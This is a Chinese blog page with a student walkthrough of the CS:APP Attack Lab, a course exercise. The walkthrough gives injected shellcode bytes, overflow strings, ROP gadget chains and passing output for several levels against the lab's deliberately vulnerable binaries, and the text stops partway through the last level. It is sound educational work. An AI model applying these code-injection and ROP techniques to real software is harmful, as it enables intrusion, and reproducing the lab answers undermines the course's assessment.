<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="努力可能会成功，但不努力真的很舒服">
<meta property="og:type" content="website">
<meta property="og:title" content="wwow&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="wwow&#39;s blog">
<meta property="og:description" content="努力可能会成功，但不努力真的很舒服">
<meta property="og:locale">
<meta property="article:author" content="wwow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>wwow's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">wwow's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/04/csapp-attackLab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/04/csapp-attackLab/" class="post-title-link" itemprop="url">csapp-attackLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-09-04 16:22:49 / 修改时间：22:21:46" itemprop="dateCreated datePublished" datetime="2020-09-04T16:22:49+08:00">2020-09-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/csapp/" itemprop="url" rel="index"><span itemprop="name">csapp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="CSAPP-AttackLab"><a href="#CSAPP-AttackLab" class="headerlink" title="CSAPP-AttackLab"></a>CSAPP-AttackLab</h3><p>GDB简要指南:<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf">http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf</a></p>
<p>AttackLab-writeup:<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">http://csapp.cs.cmu.edu/3e/attacklab.pdf</a> （建议在实验开始前认真看writeup，writeup上会告诉你每个题目的具体要求并且提供一些提示）</p>
<p>本次实验的任务是利用缓冲区溢出来制造5次不同的攻击。</p>
<p>攻击主要分为两种类型：</p>
<ol>
<li>code-injection（代码注入）：即将你的代码注入到栈中，并利用跳转语句使你注入的代码被执行。</li>
<li>return-oriented-programming（面向返回值编程？）：当系统将栈空间的数据定义为不可执行的，那么我们就无法执行注入的代码，这时候可以查看系统已有的代码，并且将它们“断章取义”，作为我们攻击代码的一部分。</li>
</ol>
<p>前三次攻击使用code-injection，后两次使用return-oriented-programming</p>
<p>压缩包中提供了两个可执行程序，分别为rtarget和ctarget，rtarget对应code-injection攻击，ctarget对应return-oriented-programming攻击（ROP）。</p>
<p>通过使用<strong>objdump</strong>将这两个可执行程序反汇编，我们可以得到它们的汇编代码。</p>
<p>这两个程序中都会调用Gets函数（书中分析过它是不安全的，可能导致缓冲区溢出），要求输入一个字符串，我们可以利用这个输入的字符串以及缓冲区溢出来组织一次攻击。</p>
<p>注意：输入的字符串不应该包含0x0a数值（对应ascii码为’\n’)</p>
<p>同时压缩包提供了另外一个工具——<strong>HEX2RAW</strong>，程序输入为一连串以空格分开的两位十六进制数的字符串，程序输出为相应字节码。默认数据以小端方式存放，例如输入“ef be ad be”实际上得到的值为0xdeadbeef。</p>
<p>每一个用户的压缩包都有一个独特的cookie值，这在题目中会用到。</p>
<p>ctarget和rtarget时可以使用以下参数：</p>
<ol>
<li><strong>-q：self-study必选参数，避免程序寻找教师的服务器</strong></li>
<li>-i FILE：从文件读取输入，而非从标准输入</li>
</ol>
<h3 id="Part1（ctargt）：Code-Injection-Attacks"><a href="#Part1（ctargt）：Code-Injection-Attacks" class="headerlink" title="Part1（ctargt）：Code Injection Attacks"></a>Part1（ctargt）：Code Injection Attacks</h3><p>part1部分的所有内容都使用ctarget文件，使用的攻击类型为代码注入。</p>
<p>part1部分既没有使用金丝雀值也没有使用栈随机化，可以利用这两点构建攻击代码。</p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>在第一个阶段，我们无需注入新的代码，而是需要利用输入的字符串将程序的PC指针重定向到touch1函数中，转而执行touch1函数。</p>
<p>writeup中提示我们使用将函数地址压栈然后调用ret的方式来重定向程序</p>
<p>首先，通过objdump反汇编ctarget</p>
<p>找到输入函数getbuf，我们需要查看目前栈的使用情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>

<p>可以看到程序为输入的字符串准备了0x28–&gt;40个字节的存储空间。</p>
<p>所以为了实现缓冲区溢出，我们首先使用一些无效字符填满这40个字节，在这40个字节之后就是getbuf的返回地址（正常情况下返回到test函数），我们需要使用touch1函数的入口地址来替换getbuf的返回地址。</p>
<p>查看touch1的入口地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br></pre></td></tr></table></figure>

<p>将touch1的入口地址转换为小端排列，得到c0 17 40 00 00 00 00 00</p>
<p>那么第一阶段的答案为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61 </span><br><span class="line">61 61 61 61 61 61 61 61 61 61 </span><br><span class="line">61 61 61 61 61 61 61 61 61 61 </span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>前40个字节任意，最后8个字节为touch1的入口地址。</p>
<p>使用hex2raw转换后作为ctarget的输入</p>
<p>执行结果如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root:~/csappLab3/target1<span class="comment"># ./hex2raw &lt; ctargetl1.txt | ./ctarget -q</span></span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 C0 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>



<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>第二个阶段，我们需要将程序的PC重定向到touch2函数上，并且还需要将cookie作为参数传递给touch2</p>
<p>首先查看一下自己的cookie和touch2的入口地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;my cookie：0x59b997fa</span><br><span class="line">00000000004017ec &lt;touch2&gt;: ;touch2入口</span><br></pre></td></tr></table></figure>

<p>函数的第一个参数存放在寄存器%rdi</p>
<p>为了达到以上目的，我们需要执行以下汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi</span><br><span class="line">pushq  $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>使用gcc和objdump（gcc得到这段汇编代码的可执行文件，再用objdump反汇编）得到这段汇编代码对应的机器码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq   ~</span><br></pre></td></tr></table></figure>

<p>这段汇编代码对应的字节码为”48 c7 c7 fa 97 b9 59 68 ec 17  40 00 c3”。</p>
<p>那么如何执行我们传入的代码呢？</p>
<p>可以发现在Part1部分，没有采用栈随机化技术，程序中栈的地址是固定的，所以我们可以计算出我们输入的数据存放的内存地址，然后将PC指针重定向到我们注入的代码处即可。</p>
<p>我在自己的机器上进行gdb调试后得到在getbuf程序中，执行完sub    $0x28,%rsp后，%rsp=0x5561dc78。</p>
<p>综上所述，得到第二阶段的答案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;地址0x5561dc78</span><br><span class="line">48 c7 c7 fa 97 b9 59 68 ec 17 </span><br><span class="line">40 00 c3 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>在执行getbuf读取输入数据后，利用缓冲区溢出，利用0x5561dc78来替换getbuf函数的返回地址，这样在执行完getbuf后，程序跳转到0x5561dc78处，执行我们输入的代码。</p>
<p>执行结果如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root:~/csappLab3/target1<span class="comment"># ./hex2raw &lt; ctargetl2.txt | ./ctarget -q</span></span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 </span><br></pre></td></tr></table></figure>



<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>第三个阶段同样要求注入一段攻击代码，这一次我们需要将程序的PC重定向到touch3上，并且以字符串形式传递cookie。</p>
<p>touch3函数调用hexmatch函数来比较cookie是否正确。</p>
<p>将cookie（0x59b997fa)转换为字符串”59b997fa”，在将字符串转换为字节码形式”35 39<br>62 39 39 37 66 61”。</p>
<p>writeup中提示hexmatch和strncmp会将新的数据压入栈中，为了防止输入的字符串cookie被新的数据覆盖，所以把字符串cookie藏在返回地址后面。</p>
<p>level2中提到，在执行getbuf输入数据时，第一个数据放在0x5561dc78处，那么返回地址就存放在0x5561dca0，返回地址占8个字节，所以字符串起始地址应该在0x5561dca8。</p>
<p>需要将字符串的首地址（0x5561dca8）存放到%rdi中，作为参数传递给touch3。</p>
<p>同样的，首先确定注入的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq </span><br></pre></td></tr></table></figure>

<p>汇编代码对应的字节码为”48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3”。</p>
<p>另外，和第二阶段一样，需要将getbuf的返回地址替换为我们输入的代码的首地址，即0x5561dc78。</p>
<p>则综上所述，得到第三阶段的答案为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 fa 18 </span><br><span class="line">40 00 c3 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 35 39 </span><br><span class="line">62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root:~/csappLab3/target1<span class="comment"># ./hex2raw &lt; ctargetl3.txt | ./ctarget -q</span></span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 </span><br></pre></td></tr></table></figure>



<h3 id="Part2：ROP"><a href="#Part2：ROP" class="headerlink" title="Part2：ROP"></a>Part2：ROP</h3><p>part2的所有内容都使用rtarget文件，使用的攻击类型为ROP。</p>
<p>part2部分使用了栈随机化技术，使得程序在每一次运行时它的栈的地址都是变化的，所以我们无法确定我们输入的代码段的起始地址，也就无法执行注入的代码。</p>
<p>另一方面，part2中将栈的地址空间定义为不可执行的，即无法执行存放在栈中的代码。</p>
<p>以上两种限制导致代码注入的方式变得不可行，我们需要采用一种新的方式，即我们不注入新的代码，而是利用系统中已有的代码，截取代码的一部分来执行。</p>
<p>例如指令 movl $0x78948d4，(%rdi)的机器码为c7 07 d4 48 89 c7</p>
<p>截取其中48 89 c7，对应汇编代码为movq %rax，%rdi</p>
<p>下面各表为不同汇编指令的机器码。</p>
<p>补充一个0x90—&gt;no op</p>
<p><img src="https://s1.ax1x.com/2020/09/04/wA36E9.png" alt="wA36E9.png"></p>
<p><img src="https://s1.ax1x.com/2020/09/04/wA3M1f.png" alt="wA3M1f.png"></p>
<p><img src="https://s1.ax1x.com/2020/09/04/wA3Nhq.png" alt="wA3Nhq.png"></p>
<p>​                    <img src="https://s1.ax1x.com/2020/09/04/wA3i6O.png" alt="wA3i6O.png"></p>
<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>在第四个阶段，我们的任务和第二个阶段一样，将程序的PC重定向到touch2，并且传递cookie作为函数参数。不同的地方在于我们要使用rtarget文件。</p>
<p>我们能够“借用”的代码为，从start_farm到mid_farm之间的所有代码。</p>
<p>通过objdump查看可用的汇编指令的机器码，对它们“断章取义”，再“为我所用”。</p>
<p>首先我们要将cookie传送到%rdi中，由于我们输入的cookie数据在栈中，要将其传送到通用寄存器中，首先需要寻找合适的popq指令。</p>
<p>根据表中的popq机器码，搜索反汇编的rtarget.s文件（根据提示，查找范围在start_farm到mid_farm之间），查看是否有合适的机器码可以被截取使用</p>
<p>找到addval_219</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>截取其中的58 90 c3，对应汇编指令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">no op</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>然后需要找到将数据从%rax传送到%rdi的方法。</p>
<p>搜索后得到setval_426满足要求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq  </span><br><span class="line">  ;截取48 89 c7 90 c3</span><br><span class="line">  ;mov %rax,%rdi</span><br><span class="line">  ;noop</span><br><span class="line">  ;ret</span><br></pre></td></tr></table></figure>

<p>至此，就完成了cookie传输到%rdi的任务，之后只要跳转到touch2函数即可。</p>
<p>touch2的起始地址为0x4017ec</p>
<p>综上所述，得到第四阶段的答案为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">ab 19 40 00 00 00 00 00 fa 97 </span><br><span class="line">b9 59 00 00 00 00 c5 19 40 00</span><br><span class="line">00 00 00 00 ec 17 40 00 00 00</span><br><span class="line">00 00</span><br></pre></td></tr></table></figure>

<p>在输入这段字符串后，程序首先会返回到0x4019ab处，执行popq %rax，这时存储在栈上的cookie(0x59b997fa)被出栈到%rax。</p>
<p>然后返回到0x4019c5处执行mov %rdi,%rax，将cookie从%rax复制到%rdi。</p>
<p>最后返回到touch2.</p>
<p>执行结果如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root:~/csappLab3/target1<span class="comment"># ./hex2raw &lt; rtargetl1.txt | ./rtarget -q</span></span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>



<h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><p>第五个阶段，我们能够“借用”从start_farm到end_farm的所有代码</p>
<p>这一部分涉及到一些特别的指令，它们不改变任何的寄存器数据以及内存单元，例如”andb %al,%al”。说明这一点的目的是因为，我们借用代码时，可能引入一些多余的机器码，我们需要区分哪些多余的机器码会影响我们的行为，而哪些不会造成影响。</p>
<p>这一阶段我们的任务和第三阶段一样，即将cookie转换为字符串后，将其作为参数传入touch3执行。</p>
<p>由于不知道栈的内存地址，所以我们也无法指导传入的字符串cookie在哪</p>
<p>那么就需要通过当前栈顶地址+偏移量，对我们传入的cookie进行相对寻址</p>
<p>可以发现writeup中提供的机器码中没有关于相加的汇编指令</p>
<p>但是看一看反汇编的rtarget.s，找到add_xy：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq  </span><br></pre></td></tr></table></figure>

<p><strong>发现了lea！！！</strong>，这条指令可以将%rdi的值与%rsi相加并存放到%rax中。</p>
<p>那么我们的思路就很清晰了，将栈顶地址（<strong>特指getbuf的返回地址存放位置</strong>）和栈顶到字符串cookie的偏移量分别存放到%rdi和%rsi中，再执行mov %rdi，%rax就完成参数传递了。</p>
<p>首先找到mov  %xxx,%rsp将栈顶地址传出</p>
<p>找到addval_190:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq   </span><br><span class="line">  ;取出48 89 e0 c3----&gt;</span><br><span class="line">  ;movq %rsp,%rax</span><br><span class="line">  ;ret</span><br></pre></td></tr></table></figure>

<p>再找到setval_426，将%rax的数据传递给%rdi</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq   </span><br><span class="line">  ;取出48 89 c7 90 c3----&gt;</span><br><span class="line">  ;movq %rax,%rdi</span><br><span class="line">  ;noop</span><br><span class="line">  ;ret</span><br></pre></td></tr></table></figure>

<p>这样就成功将栈顶地址传递到%rdi</p>
<p>然后需要将字符串cookie的偏移量传递到%rsi，由于cookie属于数据，而不是指令，所以与其他的指令需要分隔开放到最后。由于我们不知道还需要输入多少条指令，所以cookie的偏移量还无法确定，所以暂定为xx。</p>
<p>将偏移量xx出栈到%rax</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq   </span><br><span class="line">  ;取出58 90 c3---&gt;</span><br><span class="line">  ;popq %rax</span><br><span class="line">  ;noop</span><br><span class="line">  ;ret</span><br></pre></td></tr></table></figure>

<p>再将偏移量xx从%eax传递给%edx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:	c3                   	retq   </span><br><span class="line">  ;取出89 c2 84 c0 c3----&gt;</span><br><span class="line">  ;movl %eax,%edx</span><br><span class="line">  ;cmpb %cl,%cl(无意义，不影响)</span><br><span class="line">  ;ret</span><br></pre></td></tr></table></figure>

<p>再将偏移量xx从%edx传到%ecx</p>
